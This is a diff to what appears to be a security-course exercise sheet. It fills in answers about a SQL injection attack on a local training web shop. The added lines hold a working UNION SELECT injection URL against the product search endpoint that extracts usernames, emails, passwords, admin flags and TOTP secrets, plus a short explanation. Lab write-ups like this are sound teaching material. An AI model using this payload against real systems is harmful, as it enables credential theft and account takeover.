@@ -330,7 +330,11 @@ You can guess this if you want to, but the column amount can also be found in th
 
 __What SQL command did you use?__
 
+http://localhost:3000/rest/products/search?q=%27))%20UNION%20SELECT%20username,email,password,isAdmin,totpSecret,createdAt,updatedAt,deletedAt%20FROM%20Users;--
+
 __Explain shortly the logic behind your attack. Why and how does it work?__
+
+After causing the error, we can add user information to the same places that we have in products, thus revealing user informations after product informations.
 
 ---
 
